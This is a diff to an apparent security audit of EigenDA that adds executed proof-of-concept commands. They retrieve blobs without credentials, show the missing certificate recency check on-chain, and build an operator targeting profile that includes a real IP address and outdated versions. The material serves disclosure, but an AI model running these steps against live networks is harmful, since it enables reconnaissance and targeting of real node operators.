@@ -452,17 +452,36 @@ BONDA data confirms 11 dead operators (13%) as of 2026-05-11. No ejection events
 
 ## 4. PoC Scenarios
 
+> All PoCs were executed on 2026-05-12 against EigenDA mainnet and Sepolia testnet.
+
 ### PoC-1: Unauthenticated Blob Retrieval (Finding 3)
 
 **Difficulty**: Trivial
 **Prerequisites**: Knowledge of a blob key (deterministic from blob header)
+**Status**: **EXECUTED AND CONFIRMED** on both mainnet and Sepolia testnet
 
 ```
 Attack Flow:
-1. Compute blob_key = Keccak256(BlobHeader) from public on-chain data
-2. Connect to relay gRPC endpoint (public)
-3. Call GetBlob({blob_key: <computed_key>})
-4. Receive full blob data — no credentials required
+1. Query DataAPI for recent blob keys (also unauthenticated — see PoC-5)
+   $ curl -s 'https://dataapi.eigenda.xyz/api/v2/blobs/feed?limit=1'
+   → blob_key: 0d21ec282f51cf0c2501a377ef989b69c841686f69faf90f177ff7cf335e4ace
+
+2. Resolve relay URL from on-chain RelayRegistry (public):
+   $ cast call <Directory> "getAddress(string)(address)" "RELAY_REGISTRY" → 0xD160...55B
+   $ cast call <RelayRegistry> "relayKeyToUrl(uint32)(string)" 0
+   → "relay-0-mainnet-ethereum.eigenda.xyz"
+
+3. Call GetBlob with no credentials:
+   $ grpcurl -d '{"blob_key": "<base64_key>"}' \
+       relay-0-mainnet-ethereum.eigenda.xyz:443 relay.Relay/GetBlob
+
+4. Result: 2,796,221 bytes (2.7MB) of blob data returned instantly.
+
+Negative test: Invalid blob_key returns "Code: NotFound" — confirming
+the positive result was real data retrieval, not a default response.
+
+Sepolia testnet: Same attack on relay-0-testnet-sepolia.eigenda.xyz
+returned 21,865 bytes — also confirmed.
 
 Detection: Rate limiter logs only (global, no per-client attribution)
 ```
@@ -489,17 +508,40 @@ Detection: Relay metrics (if monitored), operator timeout logs
 
 **Difficulty**: Medium
 **Prerequisites**: Rollup using direct EigenDA integration without eigenda-proxy
+**Status**: **ON-CHAIN VERIFICATION CONFIRMED** — no recency function exists
 
 ```
+Verification Steps (executed on mainnet):
+
+1. Resolve CertVerifier and Router addresses:
+   $ cast call <Directory> "getAddress(string)(address)" "CERT_VERIFIER"
+   → 0x61692e93b6B045c444e942A91EcD1527F23A3FB7
+   $ cast call <Directory> "getAddress(string)(address)" "CERT_VERIFIER_ROUTER"
+   → 0x1be7258230250Bc6a4548F8D59d576a87D216C12
+
+2. Confirm NO recency function on-chain:
+   $ cast call <Router> "recencyWindowSize()(uint256)"
+   → REVERT (function does not exist)
+   $ cast call <CertVerifier> "recencyWindowSize()(uint256)"
+   → REVERT (function does not exist)
+
+3. Verify current cert version and required quorums:
+   $ cast call <CertVerifier> "certVersion()(uint8)" → 3
+   $ cast call <CertVerifier> "quorumNumbersRequired()(bytes)" → 0x0001
+
+4. Confirm: on-chain only checks RBN <= block.number (no staleness check)
+   Current block: 25,079,707
+   → A cert with RBN = 1,000,000 (24M blocks old, ~333 days)
+     would NOT be rejected by on-chain verification.
+
 Attack Flow:
 1. Record operator stake distribution at block N (attacker has large stake)
 2. Wait for stake to change (attacker reduces stake at block N+50000)
 3. Submit blob with RBN = N (referencing old stake distribution)
 4. On-chain checkDACert passes (only checks RBN <= block.number)
 5. Attacker's old stake weight counts toward quorum threshold
-6. Blob attested with less actual security than required
 
-Mitigation: Use eigenda-proxy (has off-chain recency check)
+Mitigation: Use eigenda-proxy (has off-chain recency check, window=14400 blocks)
 Detection: Compare cert RBN age against expected window
 ```
 
@@ -524,15 +566,33 @@ Detection: DynamoDB CloudTrail audit logs (if enabled)
 
 **Difficulty**: Trivial
 **Prerequisites**: DataAPI endpoint URL (discoverable via port scanning)
+**Status**: **EXECUTED AND CONFIRMED** on mainnet
 
 ```
-Attack Flow:
-1. GET /operators-info/semver-scan → map operator software versions
-2. GET /metrics/non-signers → identify non-participating operators
-3. GET /operators-info/port-check → map network topology
-4. GET /operators/liveness → identify degraded operators
-5. Cross-reference: find operators running old versions with open ports
-6. Target identified operators for code-level exploits
+Attack Flow (all executed and verified):
+
+1. GET /operators/signing-info → operator signing rates + stake percentages
+   Result: 111 operators with unsigned batches identified.
+   Top non-signers exposed:
+   - 0x3F98F47D... Q0: 0% signing, 0.725% stake (2365/2365 unsigned)
+   - 0x46b3f7b5... Q0: 0% signing, 0.668% stake (2365/2365 unsigned)
+
+2. GET /operators/node-info → operator software versions
+   Result: Full version distribution exposed:
+   - 1 operator on v0.9.1, 1 on v2.1.0, 1 on v2.2.0 (outdated)
+   - Operator IDs included for each version
+
+3. GET /operators/liveness → operator IP addresses + port status
+   Result: Every operator's dispersal and retrieval IP:port exposed:
+   - "dispersal_socket": "15.204.214.239:32006"
+   - "retrieval_socket": "15.204.214.239:32007"
+   - Online/offline status for each
+
+4. Cross-reference attack demonstrated:
+   - Outdated version operators identified by ID
+   - IPs resolved from liveness endpoint
+   - Signing rates confirm which operators are actively participating
+   → Complete operator targeting profile built with zero authentication
 
 Detection: None (no auth, no access logging by default)
 ```
